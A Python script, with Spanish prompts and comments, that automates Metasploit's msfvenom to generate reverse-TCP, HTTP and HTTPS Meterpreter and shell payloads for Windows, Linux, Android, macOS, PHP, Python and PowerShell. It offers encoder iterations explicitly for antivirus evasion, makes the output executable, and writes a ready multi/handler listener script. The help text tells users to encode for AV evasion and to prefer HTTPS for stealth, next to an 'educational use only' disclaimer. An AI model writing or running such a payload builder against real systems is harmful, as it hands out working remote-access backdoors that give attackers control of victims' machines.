#!/usr/bin/env python3
"""
MSFVenom Automation Script con Estilo Hacker - Versión Mejorada
Autor: Script Automatizado para Metasploit
Versión: 3.0
"""

import os
import sys
import subprocess
import time
import re
import socket
from datetime import datetime
from pathlib import Path

# Colores para estilo hacker
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Banner estilo hacker
def show_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
    ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
    ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
    ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
    ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
    ██║ ╚═╝ ██║███████║███████╗ ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
    ╚═╝     ╚═╝╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
    
    {Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
    ║           AUTOMATED PAYLOAD GENERATOR v3.0 [MEJORADO]      ║
    ║               MSFVenom Automation Script                    ║
    ╚══════════════════════════════════════════════════════════════╝{Colors.END}
    """
    print(banner)

# Validar dirección IP
def validate_ip(ip):
    """Valida que la dirección IP sea correcta"""
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if pattern.match(ip):
        parts = ip.split('.')
        if all(0 <= int(part) <= 255 for part in parts):
            return True
    return False

# Validar puerto
def validate_port(port):
    """Valida que el puerto sea válido"""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

# Obtener IP local automáticamente
def get_local_ip():
    """Obtiene la IP local del sistema"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"

# Verificar si msfvenom está instalado
def check_msfvenom():
    """Verifica la instalación de MSFVenom"""
    print(f"\n{Colors.YELLOW}[*] Verificando instalación de MSFVenom...{Colors.END}")
    try:
        result = subprocess.run(['which', 'msfvenom'], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"{Colors.GREEN}[+] MSFVenom encontrado en: {result.stdout.strip()}{Colors.END}")
            
            # Verificar versión
            version_result = subprocess.run(['msfvenom', '--version'], capture_output=True, text=True)
            if version_result.returncode == 0:
                version = version_result.stdout.strip().split('\n')[0]
                print(f"{Colors.GREEN}[+] {version}{Colors.END}")
            return True
        else:
            print(f"{Colors.RED}[-] MSFVenom no encontrado.{Colors.END}")
            print(f"{Colors.YELLOW}[!] Instala Metasploit Framework desde: https://www.metasploit.com{Colors.END}")
            return False
    except Exception as e:
        print(f"{Colors.RED}[-] Error al verificar MSFVenom: {e}{Colors.END}")
        return False

# Mostrar opciones de payload con categorías
def show_payload_options():
    """Muestra opciones de payloads organizadas por categorías"""
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}[+] SELECCIÓN DE PAYLOADS DISPONIBLES{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    
    payloads = {
        "Windows": {
            "1": {"name": "Windows Meterpreter Reverse TCP (Recomendado)", 
                  "payload": "windows/meterpreter/reverse_tcp", "format": "exe"},
            "2": {"name": "Windows Meterpreter Reverse HTTP", 
                  "payload": "windows/meterpreter/reverse_http", "format": "exe"},
            "3": {"name": "Windows Meterpreter Reverse HTTPS", 
                  "payload": "windows/meterpreter/reverse_https", "format": "exe"},
            "4": {"name": "Windows Shell Reverse TCP", 
                  "payload": "windows/shell/reverse_tcp", "format": "exe"},
        },
        "Linux": {
            "5": {"name": "Linux x86 Meterpreter Reverse TCP", 
                  "payload": "linux/x86/meterpreter/reverse_tcp", "format": "elf"},
            "6": {"name": "Linux x64 Meterpreter Reverse TCP", 
                  "payload": "linux/x64/meterpreter/reverse_tcp", "format": "elf"},
            "7": {"name": "Linux Shell Reverse TCP", 
                  "payload": "linux/x86/shell_reverse_tcp", "format": "elf"},
        },
        "Mobile": {
            "8": {"name": "Android Meterpreter Reverse TCP", 
                  "payload": "android/meterpreter/reverse_tcp", "format": "apk"},
        },
        "Scripting": {
            "9": {"name": "Python Meterpreter Reverse TCP", 
                  "payload": "python/meterpreter/reverse_tcp", "format": "py"},
            "10": {"name": "PHP Meterpreter Reverse TCP", 
                   "payload": "php/meterpreter/reverse_tcp", "format": "raw"},
            "11": {"name": "PowerShell Reverse TCP", 
                   "payload": "cmd/windows/powershell_reverse_tcp", "format": "ps1"},
        },
        "Mac OS": {
            "12": {"name": "Mac OS X x64 Meterpreter Reverse TCP", 
                   "payload": "osx/x64/meterpreter_reverse_tcp", "format": "macho"},
        },
        "Otro": {
            "13": {"name": "Custom Payload (Personalizado)", 
                   "payload": "custom", "format": "custom"}
        }
    }
    
    # Mostrar payloads por categoría
    for category, items in payloads.items():
        print(f"\n{Colors.PURPLE}{Colors.BOLD}► {category}:{Colors.END}")
        for key, value in items.items():
            print(f"  {Colors.GREEN}[{key.rjust(2)}]{Colors.END} {value['name']}")
    
    print(f"\n{Colors.YELLOW}[?] Selecciona el número del payload (1-13): {Colors.END}", end="")
    choice = input().strip()
    
    # Buscar payload seleccionado
    for category_items in payloads.values():
        if choice in category_items:
            if choice == "13":
                print(f"{Colors.YELLOW}[?] Introduce el payload personalizado: {Colors.END}", end="")
                custom_payload = input().strip()
                print(f"{Colors.YELLOW}[?] Introduce el formato (exe/elf/raw/etc): {Colors.END}", end="")
                custom_format = input().strip()
                return custom_payload, custom_format
            return category_items[choice]["payload"], category_items[choice]["format"]
    
    print(f"{Colors.RED}[-] Opción no válida. Usando Windows Meterpreter Reverse TCP por defecto.{Colors.END}")
    time.sleep(1)
    return "windows/meterpreter/reverse_tcp", "exe"

# Opciones de codificación
def get_encoder_options():
    """Pregunta si se desea usar codificación"""
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}[+] OPCIONES DE CODIFICACIÓN{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    
    print(f"\n{Colors.YELLOW}[?] ¿Deseas codificar el payload para evasión? (s/n): {Colors.END}", end="")
    encode = input().strip().lower()
    
    if encode in ['s', 'si', 'y', 'yes']:
        print(f"\n{Colors.GREEN}[1]{Colors.END} x86/shikata_ga_nai (Recomendado)")
        print(f"{Colors.GREEN}[2]{Colors.END} x64/xor")
        print(f"{Colors.GREEN}[3]{Colors.END} cmd/powershell_base64")
        print(f"{Colors.GREEN}[4]{Colors.END} Sin encoder específico")
        
        print(f"\n{Colors.YELLOW}[?] Selecciona el encoder (1-4): {Colors.END}", end="")
        encoder_choice = input().strip()
        
        encoders = {
            "1": "x86/shikata_ga_nai",
            "2": "x64/xor",
            "3": "cmd/powershell_base64",
            "4": None
        }
        
        encoder = encoders.get(encoder_choice, "x86/shikata_ga_nai")
        
        if encoder:
            print(f"\n{Colors.YELLOW}[?] Número de iteraciones (1-20, recomendado: 5): {Colors.END}", end="")
            iterations = input().strip()
            try:
                iterations = int(iterations) if iterations else 5
                iterations = max(1, min(20, iterations))
            except ValueError:
                iterations = 5
            
            return encoder, iterations
    
    return None, 0

# Generar payload mejorado
def generate_payload(payload_type, lhost, lport, output_file, payload_format, encoder=None, iterations=0):
    """Genera el payload con opciones mejoradas"""
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}[+] GENERANDO PAYLOAD{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    
    print(f"{Colors.YELLOW}[*] Payload: {payload_type}{Colors.END}")
    print(f"{Colors.YELLOW}[*] LHOST: {lhost}{Colors.END}")
    print(f"{Colors.YELLOW}[*] LPORT: {lport}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Formato: {payload_format}{Colors.END}")
    if encoder:
        print(f"{Colors.YELLOW}[*] Encoder: {encoder} (x{iterations} iteraciones){Colors.END}")
    print(f"{Colors.YELLOW}[*] Archivo de salida: {output_file}{Colors.END}")
    
    # Construir comando msfvenom
    cmd = [
        'msfvenom',
        '-p', payload_type,
        f'LHOST={lhost}',
        f'LPORT={lport}',
        '-f', payload_format
    ]
    
    # Añadir encoder si existe
    if encoder:
        cmd.extend(['-e', encoder, '-i', str(iterations)])
    
    # Añadir archivo de salida
    cmd.extend(['-o', output_file])
    
    print(f"\n{Colors.PURPLE}[*] Comando ejecutado:{Colors.END}")
    print(f"{Colors.PURPLE}{' '.join(cmd)}{Colors.END}")
    
    try:
        print(f"\n{Colors.YELLOW}[*] Generando payload, por favor espera...{Colors.END}")
        
        # Mostrar barra de progreso simulada
        for i in range(5):
            print(f"{Colors.GREEN}{'█' * (i+1)*10}{' ' * (50-(i+1)*10)}{Colors.END} {(i+1)*20}%", end="\r")
            time.sleep(0.3)
        print()
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\n{Colors.GREEN}[+] ¡Payload generado exitosamente!{Colors.END}")
            print(f"{Colors.GREEN}[+] Archivo guardado como: {output_file}{Colors.END}")
            
            # Mostrar información del archivo
            if os.path.exists(output_file):
                size = os.path.getsize(output_file)
                print(f"{Colors.GREEN}[+] Tamaño del archivo: {size:,} bytes ({size/1024:.2f} KB){Colors.END}")
                
                # Hacer ejecutable si es necesario
                if payload_format in ['elf', 'macho', 'py']:
                    os.chmod(output_file, 0o755)
                    print(f"{Colors.GREEN}[+] Permisos de ejecución establecidos{Colors.END}")
                
                # Mostrar comando para handler
                show_handler_command(payload_type, lhost, lport)
            return True
        else:
            print(f"\n{Colors.RED}[-] Error al generar payload:{Colors.END}")
            if result.stderr:
                print(f"{Colors.RED}{result.stderr}{Colors.END}")
            if result.stdout:
                print(f"{Colors.YELLOW}{result.stdout}{Colors.END}")
            return False
    except FileNotFoundError:
        print(f"{Colors.RED}[-] Error: msfvenom no encontrado en el PATH{Colors.END}")
        return False
    except Exception as e:
        print(f"{Colors.RED}[-] Error inesperado: {e}{Colors.END}")
        return False

# Mostrar comando para handler mejorado
def show_handler_command(payload_type, lhost, lport):
    """Muestra y guarda el comando para msfconsole"""
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}[+] CONFIGURACIÓN DEL LISTENER (MSFCONSOLE){Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    
    handler_cmd = f"""use exploit/multi/handler
set PAYLOAD {payload_type}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z"""
    
    print(f"{Colors.GREEN}{handler_cmd}{Colors.END}")
    
    # Crear directorio para outputs si no existe
    output_dir = Path("msfvenom_outputs")
    output_dir.mkdir(exist_ok=True)
    
    # Guardar comando en archivo con timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    handler_file = output_dir / f"handler_{timestamp}.rc"
    
    try:
        with open(handler_file, 'w') as f:
            f.write(handler_cmd)
        
        print(f"\n{Colors.YELLOW}[*] Comando guardado en: {handler_file}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Ejecutar listener: {Colors.BOLD}msfconsole -r {handler_file}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[-] Error al guardar archivo de handler: {e}{Colors.END}")

# Efectos de terminal mejorados
def terminal_effects():
    """Efectos visuales de inicio"""
    print(f"\n{Colors.PURPLE}[*] Inicializando sistema...{Colors.END}")
    time.sleep(0.3)
    
    stages = [
        "Verificando dependencias",
        "Cargando módulos",
        "Preparando entorno"
    ]
    
    for stage in stages:
        print(f"{Colors.CYAN}[*] {stage}...{Colors.END}", end="")
        time.sleep(0.2)
        print(f" {Colors.GREEN}✓{Colors.END}")
    
    print(f"\n{Colors.GREEN}[*] ¡Sistema listo!{Colors.END}")
    time.sleep(0.3)

# Mostrar ayuda mejorada
def show_help():
    """Muestra información de ayuda"""
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}[+] INFORMACIÓN Y AYUDA{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    
    help_text = f"""
{Colors.YELLOW}📋 Uso del script:{Colors.END}
  1. Ejecuta: python3 msfvenom_automation.py
  2. Sigue las instrucciones en pantalla
  3. Los archivos se guardarán en: ./msfvenom_outputs/

{Colors.YELLOW}🔒 Consideraciones de seguridad:{Colors.END}
  • Este script es SOLO para fines educativos y pruebas legales
  • Obtén autorización antes de realizar pruebas de penetración
  • No uses estos payloads en sistemas sin permiso explícito

{Colors.YELLOW}💡 Tips:{Colors.END}
  • Usa encoders para mejorar la evasión de antivirus
  • Considera usar HTTPS en lugar de TCP para mayor sigilo
  • Prueba tus payloads en entornos controlados primero

{Colors.YELLOW}📚 Recursos:{Colors.END}
  • Documentación Metasploit: https://docs.metasploit.com
  • MSFVenom Cheatsheet: https://github.com/rapid7/metasploit-framework
    """
    
    print(help_text)

# Función principal mejorada
def main():
    """Función principal del script"""
    try:
        # Limpiar pantalla
        os.system('clear' if os.name == 'posix' else 'cls')
        
        # Mostrar banner
        show_banner()
        
        # Efectos de terminal
        terminal_effects()
        
        # Verificar msfvenom
        if not check_msfvenom():
            print(f"\n{Colors.RED}[-] No se puede continuar sin MSFVenom instalado.{Colors.END}")
            sys.exit(1)
        
        # Obtener información del usuario
        print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
        print(f"{Colors.BLUE}{Colors.BOLD}[+] CONFIGURACIÓN DEL PAYLOAD{Colors.END}")
        print(f"{Colors.CYAN}{'='*70}{Colors.END}")
        
        # Obtener LHOST con validación
        local_ip = get_local_ip()
        print(f"\n{Colors.YELLOW}[?] Introduce la dirección IP - LHOST [{local_ip}]: {Colors.END}", end="")
        lhost = input().strip()
        
        if not lhost:
            lhost = local_ip
            print(f"{Colors.GREEN}[*] Usando IP local detectada: {lhost}{Colors.END}")
        else:
            while not validate_ip(lhost):
                print(f"{Colors.RED}[-] IP inválida. Intenta de nuevo.{Colors.END}")
                print(f"{Colors.YELLOW}[?] Introduce la dirección IP (LHOST): {Colors.END}", end="")
                lhost = input().strip()
        
        # Obtener LPORT con validación
        print(f"{Colors.YELLOW}[?] Introduce el puerto - LPORT [4444]: {Colors.END}", end="")
        lport = input().strip()
        
        if not lport:
            lport = "4444"
            print(f"{Colors.GREEN}[*] Usando puerto por defecto: {lport}{Colors.END}")
        else:
            while not validate_port(lport):
                print(f"{Colors.RED}[-] Puerto inválido (debe estar entre 1-65535).{Colors.END}")
                print(f"{Colors.YELLOW}[?] Introduce el puerto (LPORT): {Colors.END}", end="")
                lport = input().strip()
        
        # Seleccionar payload
        payload_type, payload_format = show_payload_options()
        
        # Opciones de codificación
        encoder, iterations = get_encoder_options()
        
        # Crear directorio de outputs
        output_dir = Path("msfvenom_outputs")
        output_dir.mkdir(exist_ok=True)
        
        # Nombre de archivo de salida
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        default_name = f"payload_{timestamp}"
        
        print(f"\n{Colors.YELLOW}[?] Nombre del archivo de salida [{default_name}]: {Colors.END}", end="")
        output_file = input().strip()
        
        if not output_file:
            output_file = default_name
        
        # Añadir extensión apropiada
        extensions = {
            'exe': '.exe',
            'elf': '',
            'apk': '.apk',
            'py': '.py',
            'raw': '.php',
            'ps1': '.ps1',
            'macho': '',
            'custom': ''
        }
        
        if '.' not in output_file and payload_format in extensions:
            output_file += extensions[payload_format]
        
        # Ruta completa del archivo
        output_path = output_dir / output_file
        
        # Generar payload
        success = generate_payload(payload_type, lhost, lport, str(output_path), 
                                  payload_format, encoder, iterations)
        
        if success:
            print(f"\n{Colors.GREEN}{'='*70}{Colors.END}")
            print(f"{Colors.GREEN}{Colors.BOLD}[+] ✓ OPERACIÓN COMPLETADA CON ÉXITO{Colors.END}")
            print(f"{Colors.GREEN}{'='*70}{Colors.END}")
            
            # Mostrar resumen
            print(f"\n{Colors.BLUE}{Colors.BOLD}📊 RESUMEN:{Colors.END}")
            print(f"   {Colors.CYAN}Payload:{Colors.END} {payload_type}")
            print(f"   {Colors.CYAN}LHOST:{Colors.END} {lhost}")
            print(f"   {Colors.CYAN}LPORT:{Colors.END} {lport}")
            print(f"   {Colors.CYAN}Formato:{Colors.END} {payload_format}")
            if encoder:
                print(f"   {Colors.CYAN}Encoder:{Colors.END} {encoder} (x{iterations})")
            print(f"   {Colors.CYAN}Archivo:{Colors.END} {output_path}")
            print(f"   {Colors.CYAN}Handler:{Colors.END} ./msfvenom_outputs/handler_*.rc")
        else:
            print(f"\n{Colors.RED}{'='*70}{Colors.END}")
            print(f"{Colors.RED}{Colors.BOLD}[-] ✗ OPERACIÓN FALLIDA{Colors.END}")
            print(f"{Colors.RED}{'='*70}{Colors.END}")
            print(f"\n{Colors.YELLOW}[!] Revisa los errores anteriores y intenta nuevamente.{Colors.END}")
        
        # Mostrar ayuda
        show_help()
        
        print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
        print(f"{Colors.PURPLE}[*] Script finalizado. ¡Hasta la próxima, hacker!{Colors.END}")
        print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Script interrumpido por el usuario (Ctrl+C).{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error inesperado: {e}{Colors.END}")
        import traceback
        print(f"{Colors.YELLOW}{traceback.format_exc()}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()